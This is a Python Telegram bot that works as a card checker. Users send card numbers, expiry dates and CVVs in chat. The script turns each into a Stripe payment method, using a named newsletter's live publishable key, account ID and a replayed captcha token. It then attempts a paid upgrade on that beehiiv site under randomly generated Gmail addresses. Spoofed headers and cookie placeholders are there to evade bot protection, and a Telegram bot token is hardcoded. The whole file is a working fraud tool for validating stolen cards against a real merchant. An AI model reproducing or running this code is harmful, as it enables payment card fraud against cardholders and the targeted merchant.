import telebot
import requests
import json
import random
import string
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Replace with your actual Telegram Bot Token
BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
bot = telebot.TeleBot(BOT_TOKEN)

# Stripe API Keys (Keep these secure!)
STRIPE_PUBLIC_KEY = "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc00ZCrkXrxL"
STRIPE_ACCOUNT = "acct_1P8VrT2c8u2J1Y94"  # Updated Stripe Account

# Resident Urbanist Upgrade URL
UPGRADE_URL = "https://nicdetommaso.beehiiv.com/upgrade?_data=routes%2Fupgrade"  # Updated URL

# Headers (some are dynamic and will be set later)
BASE_HEADERS = {
    "Host": "nicdetommaso.beehiiv.com",  # Updated Host
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Sec-Fetch-Site": "same-origin",
    "Origin": "https://nicdetommaso.beehiiv.com",  # Updated Origin
    "Content-Length": "370",  # Example, will be updated dynamically
    "Baggage": "sentry-environment=production,sentry-release=0547237ef3789e8ae74a6615c4e995ef3b31deee,sentry-public_key=35c3cc890abe9dbb51e6e513fcd6bbca,sentry-trace_id=29a1af691ba94ae7949a7bc51d8ad34c,sentry-sample_rate=0,sentry-transaction=routes%2Fupgrade,sentry-sampled=false",
    "Sec-Fetch-Mode": "cors",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Referer": "https://nicdetommaso.beehiiv.com/upgrade",  # Updated Referer
    "Sec-Fetch-Dest": "empty",
    "Sentry-Trace": "29a1af691ba94ae7949a7bc51d8ad34c-9214c8aa3262176d-0",
    "Accept-Language": "en-US,en;q=0.9",
    "Priority": "u=3, i",
    "Accept-Encoding": "gzip, deflate, br",
}

# Cookies (You MUST update these with a valid set from your browser)
COOKIES = {
    "__stripe_mid": "YOUR_STRIPE_MID",
    "__stripe_sid": "YOUR_STRIPE_SID",
    "_px3": "YOUR_PX3",
    "visit_token": "YOUR_VISIT_TOKEN",
    "_pxvid": "YOUR_PXVID",
    "pxcts": "YOUR_PXCTS",
    "language": "en",
    "_bhp": "YOUR_BHP",
    "cf_clearance": "YOUR_CF_CLEARANCE",
    "__cf_bm": "YOUR_CF_BM",
}

# Function to generate a random string
def generate_random_string(pattern):
    result = ''
    for char in pattern:
        if char == '?':
            result += random.choice(string.ascii_lowercase + string.ascii_uppercase)
        elif char == 'u':
            result += random.choice(string.ascii_uppercase)
        elif char == 'l':
            result += random.choice(string.ascii_lowercase)
        elif char == 'd':
            result += random.choice(string.digits)
        else:
            result += char
    return result

# Function to perform the GET_PM request
def get_payment_method(cc, cvv, mes, ano, email_prefix):
    url = "https://api.stripe.com/v1/payment_methods"
    payload = f"type=card&billing_details[email]={email_prefix}%40gmail.com&billing_details[address][postal_code]=10080&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=ca37b869-baff-4609-bfd3-61a2168fdef748f4b0&muid=03a73ed1-38c6-48e6-a0f1-69ac8bcdf3a9a61c51&sid=106795cc-523a-42d1-959c-c8b9db428911665224&pasted_fields=number&payment_user_agent=stripe.js%2Fb85ba7b837%3B+stripe-js-v3%2Fb85ba7b837%3B+card-element&referrer=https%3A%2F%2Fnicdetommaso.beehiiv.com&time_on_page=70570&key={STRIPE_PUBLIC_KEY}&_stripe_account={STRIPE_ACCOUNT}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoidzUrWW1TY3pHaWFBLzU4VVJJblZCekh4UWNuY1UwS3JsanRSSHA4N0p2ZEpSa082a0svQWEva1BpUHhaYUx2azMwU1dqUDEwQ2xmNnFsbjlZWDJsMWttd3M1OFhGZS92YWRLR0ZNanRjdTNpa2hSbngzdGxJc05HRmJXK0tRRnBlMlJpNzdVN0w5QTNsQ2RGYnJlTU9QYndkeUFpdm9kb2tZRXd4blB1czhRb1VydTQzVmV5QjVsVy9BSWhrcG9qNHBTc0ZNOXp6cVliRVUzdWRleHhQTW56Z09TQ1pmNWU1WDV5bDNkdkMzNVdIY09LUVNITWVnVGRoUU0zNzFBTTd1a09UeTB1bk9jTDZEbTRJUGVaN05hUnB6VGJNeS9RVTVaZW8zTm9JTXV0UUF5bTRQMlBTc0c3UVVobThrTGh2bmRDYlRlMER5SlNhcUp0R01hVGZnOXN6YlNIZWZKaGdVT3F6RnJkMjVwVk9MSUNwZmt6MFp6T2cyL2FlN0dEcWlqa3ovb1NFTTc2blpjUEhhVTM3dUZqcytrUkNGZ2RBRXRFSFQ0S3RaNDZmREEybHg1NGhkV3dQQ3ZOOU9wblc3a1R2RHBheHZMUXY5dnlWS2V1VE5td3NKQ0wrOXErcWM4MytrdHEvbGZ3dk1sY3JxaTdmc2toOGRRU1Y5MEhWUWFTZlJvTVdqN3I0blNoYUhMZ2g4Z3Q0MzZkbDU4OUgycmdQYjl6MVNrU2doNUxKTHdZMzFNTWxtRy8ydzhkS0dHcXZZVkxtNG9pZk9BOEhWUCtJRHZxLzYweXZEMWp2Q3kvSWE4NEtZMnRLYU9wZ2ZJWnBzRXlVaGk2UmR3TSt0RFYzeWYyOWtpbmxtZUVLNTNvTVpwN2pIZzVHeUJKZkFkclhiKzg4dWNIbEczMnFzNWJuZFVzN2Q3ZTNPM2JGOGhtTHhBMjJySm9QU28rLysrRXNtQng2VEJ1Sks0akhUOUkzN1FwWnZBbzVnMzVjSXQvNjZGaXdjUmNhOWR2OWhNUHE1U3JlMzZmZzVDQXM0eGVZclY5SDFIaFBldHhTemQ0b0pMeDBqQ1lrMkZLUUNlYW1WbTMrSWpUNTIvZUYrNzBpUWNDV2lXay93cHBsZWdjSC9sWmd2azF4RnNweFhmYmNvVGFHdmlVU3R5TURDcklaTmpTWERURVVsc2RZb2hZSkEvV09YZVZOdWhsckhCVVlUZDUzbHJUZ3ZRb3JXMTVSYmxaejhGMEFPOGpidFNhTUQzN0sxQzlFbExQVDFNQnovaFNxWjdoNlg5cDRRd3JFV0M4c3pRSmZEQUw4aVFISDJvcWxzNjdjcWtoYnZ6azdaa1JKaFczMHNVZU1kSk1RdDltbkJPYlJPT1Y4S3lrK2U4SXpmT1Rtb2hIaG5jdGxQQ29DQ3ZjblNkT0RncUowaHdUYnFXSHZjdFRBYk5Fek5FT0trenFKbVZmOHN4MWZ4SlRuWGJWc3AwNFFXSVFwSWRoR2djb1BGNkIvZDJiQmVIS2M3TlBnOXNSc253Q0FMN0xNSjNDK1djV2R6TTJYL2VhNldOZEdLWVUyeGZyM2dJSGpFcThHdUdoTWhwKzEyK01QZkJxSFNmaU9DNm5TS2NhN09CT1JpY3RXc1Y3RkVCQnhSNnp2UTNiU0lFRDkxenFVdDEycDJ4WUVVaVBiWGlqZmpjS016NUk4UG00RFRSZTRaK2FkM1U0nk9MMkdPcTlkMUdvN0lyK3UrUGhwZTJyN1A5S0hjY3Q3eEJhTkZEYWZFeDU4Uk81Mm5qQVZ0ZWJmOUQ4d2F3cHEwZUJMZys3ZFFZQWYxVWxZc0pLVzM1b2dBcFN2NFhkeWJQa0pFYlh3OFFSbmtIRnVUdFJnbDhPeVhtRThsMjhsM2dNVmZQVmticndEb3VLeVZuK0U0dWZCSTRHWXNSZlVYU1pBWnpoL0o1QXA2blZMZDM0OUFBRll1c29QYkpPUnYrMGs1MWszWWVpNWhMQzhrYkUvcEtVMFJQSERKbXVaL1J5c0pNdk5HdFl0M3o0emdYNFNzVjhiYUZyZFZEV2hjZi9ISWVFTWZra21vUjhwZ1UvSU1zd3M0U3NUaVIxcHRRRGJvMEMzbCtyVSszdGVTUjJjdi9pUUxGeU5PSVpsRzhVdFo4SS9sdUNEWTF2Q3hEM1Z6WHpuTUhpRS9mV09vb0o1STlsZkVrem1YWG5pU2ZyeXA4UkhHd2tMZ21JenRyOWU5T0d4cENVRmNEQmNJZS9Gc2tOQjJNWlpNVVB5YWJlaEFaaHBWUjk1Q0djcXFTNUR2WVdGV3BPRHFCS3ExdysvSHlaYnZST1pUZ2s1dUZ0dHRyVVpsZ0NDSmsrd0NKUEFPcUlmb3pYNEtuZ2orV21FalRZd3NYVTFNeDhrd2p2TGxId0hHekNUL0JUSWRDdFZyOTIrRXo5K0VHMzVWd0h2WG5OWEI4SjFlc0p5U3ljSnYrNm5CUlVaSFVCYmpVaUlVVmk1ZWVHbWhwcE9MUmVDU1l6UnhpZ2kyZTJibkpuZFpJUGRNbk9jalBCQzhzb2ozbnBZNnlxcEJlSVJxeVJVUWxtS3FpN0tQTjh0YUhyTVFFRTlhYXJZd2ZNeW1TYUJFZzVTb3FhekYzNXhDb0t3NlNUTXk3R2RxT2d1SXBBN3VSKytsUUdEdkNOZlA4QVVDRE96NWhQUnNwbnVNUFU4UjlWLzVOY3k5UVlFdHFoWGNUVlBldHBCdnhVN096ZUJKaWtDTHQwN253WlJGUjZwc0wzMUFHdkZncVVYRWVvelhBZVRCTHVHZVc5NHlzUVZoci9YQkUwK0ppOHJnPT0iLCJleHAiOjE3NDU3NjcwOTUsInNoYXJkX2lkIjo1MzU3NjU1OSwia3IiOiIyZDc5OTFiYSIsInBkIjowLCJjZGF0YSI6IjlsZTNaZHFrVFI5Y2pHR2NEL0MvSjFUL1F6bTlMcDlJMldHNkZzRzJRQ01aNk5VSkNBUC9YOVFXbXdzWlhlWnBpSnhpY0pmeFkzYjg0cUh1UWpzQXova1hac0NyY2xpYlowMHRadnJDSkt1VmYvUkcyYzY4b0RNWkFPSGlmZG55clNOZmI3QnpTMDRGaGowQ01ING4zK0kyV1ZqTGpNZEpuaHdPdDJjcG1xdWZISzByNU5ISDFkNkRzM2xyUmM5R1gyY1F0M2djYVhyZkVhNlQifQ.rc9HS91dvr-r0nEh4mFN3kgPtlQC4wMkVf2Ps_xO7CI"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
        "Accept": "application/json",
        "Host": "api.stripe.com",
        "Origin": "https://js.stripe.com",
        "Referer": "https://js.stripe.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
    }
    try:
        response = requests.post(url, headers=headers, data=payload)
        response.raise_for_status()
        return response.json().get("id")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in GET_PM request: {e}")
        return None

# Function to perform the $5_UPGRADE request
def perform_upgrade(em_var, pm_var, email):
    url = UPGRADE_URL
    payload = f"email={em_var}%40gmail.com&force_three_d_secure=false&price_id=33af17df-aeeb-4c52-a211-d87594ee966b&premium_offer_id=&last_resource_guid=&upgrade_error_message=Oops%2C+something+went+wrong.&upgrade_success_message=You+are+now+a+premium+subscriber&payment_method={pm_var}&email={email}%40gmail.com&tax_id=&tax_id_type=&amount_cents=100"
    headers = BASE_HEADERS.copy()
    try:
        response = requests.post(url, headers=headers, data=payload, cookies=COOKIES)
        response.raise_for_status()
        logging.info(f"Upgrade Response JSON: {response.json()}")
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in $5_UPGRADE request: {e}")
        logging.error(f"Upgrade Response Text: {response.text}")
        return {"status": "error", "message": str(e)}
    except json.JSONDecodeError:
        logging.error(f"Error decoding JSON in $5_UPGRADE response. Text: {response.text}")
        return {"status": "error", "message": f"Failed to decode response: {response.text}"}

# Telegram Bot Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me credit card details in the format: cc|mm|yy|cvv")

@bot.message_handler(func=lambda message: len(message.text.split('|')) == 4)
def process_card(message):
    try:
        cc, mm, yy, cvv = message.text.split('|')
        if len(yy) == 2:
            ano = f"20{yy}"
        elif len(yy) == 4:
            ano = yy
        else:
            bot.reply_to(message, "Invalid year format. Please use MM|YY or MM|YYYY.")
            return

        bot.reply_to(message, "Processing card...")
        em_var = generate_random_string("?u?l?l?l?l?l?l?l?l?l?d?d")
        email = f"PeshangSalam{random.randint(1000, 9999)}@gmail.com" # Generate a more realistic email
        email_prefix = email.split('@')[0]
        pm_var = get_payment_method(cc, cvv, mm, ano, email_prefix)

        if pm_var:
            bot.reply_to(message, f"Payment Method ID obtained: {pm_var}. Now attempting upgrade...")
            upgrade_result = perform_upgrade(em_var, pm_var, email_prefix)
            time.sleep(5)  # Simulate 5-second delay

            if upgrade_result and upgrade_result.get("status") == "success":
                status_text = upgrade_result.get("status")
                message_text = upgrade_result.get("message", "Upgrade successful!")
                bot.reply_to(message, f"Upgrade Status: {status_text}\nMessage: {message_text}")
            elif upgrade_result and "error" in upgrade_result.get("status", "").lower():
                status_text = upgrade_result.get("status")
                message_text = upgrade_result.get("message", "Upgrade failed.")
                bot.reply_to(message, f"Upgrade Status: {status_text}\nMessage: {message_text}")
            else:
                bot.reply_to(message, f"Upgrade attempt failed or status could not be determined.\nRaw Response: {upgrade_result}")
        else:
            bot.reply_to(message, "Failed to obtain Payment Method ID. Card might be invalid.")

    except Exception as e:
        logging.error(f"Error processing card input: {e}")
        bot.reply_to(message, "Invalid input format. Please use: cc|mm|yy|cvv")

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Send me credit card details in the format: cc|mm|yy|cvv")

if __name__ == '__main__':
    logging.info("Bot started...")
    bot.polling(none_stop=True)